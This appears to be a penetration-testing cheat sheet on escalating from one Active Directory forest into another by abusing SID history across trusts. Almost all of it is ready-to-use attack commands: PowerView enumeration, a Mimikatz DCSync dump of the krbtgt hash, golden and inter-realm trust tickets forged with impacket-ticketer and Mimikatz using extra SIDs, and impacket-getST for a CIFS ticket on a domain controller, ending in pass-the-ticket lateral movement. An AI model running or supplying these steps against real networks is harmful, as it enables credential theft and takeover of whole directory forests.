# Forest to Forest - Extra SID (SID History \ TREAT_AS_EXTERNAL)

#### 1) Golden Ticket

 - Get-DomainSID -Domain DOMAIN (Powerview)

 - Get-DomainSID -Domain TARGET_DOMAIN (Powerview)

 - Get-DomainGroupMember -Identity "GROUP" -Domain TARGET_DOMAIN (SID filtering, Find group with SID > 1000) (Powerview)

 - impacket-ticketer -nthash KRBTGT_HASH -domain-sid FROM_DOMAIN_SID -domain FROM_DOMAIN -extra-sid TO_DOMAIN-GROUP_ID goldenuser (Group ID must be > 1000)

## OR 

 - mimikatz lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt

 - mimikatz kerberos::golden /user:Administrator /krbtgt:KRBTGT_HASH /domain:DOMAIN /sid:USER_SID /sids:ROOT_DOMAIN_SID-GROUP_SID_SUP_1000 /ptt

#### 2) Trust Ticket

### Get the trust ticket in the ntds (TARGET_DOMAIN$)

 - impacket-ticketer -nthash TRUST_KEY -domain-sid FROM_DOMAIN_SID -domain FROM_DOMAIN -extra-sid TO_DOMAIN-GROUP_ID -spn krbtgt/TO_DOMAIN trustuser (Group id must be > 1000)

 - impacket-getST -k -no-pass -spn cifs/DC_FQDN PARENT_DOMAIN/trustfakeuser@PARENT_DOMAIN -debug

### With both these attacks we perform lateral movement with Pass-the-Ticket
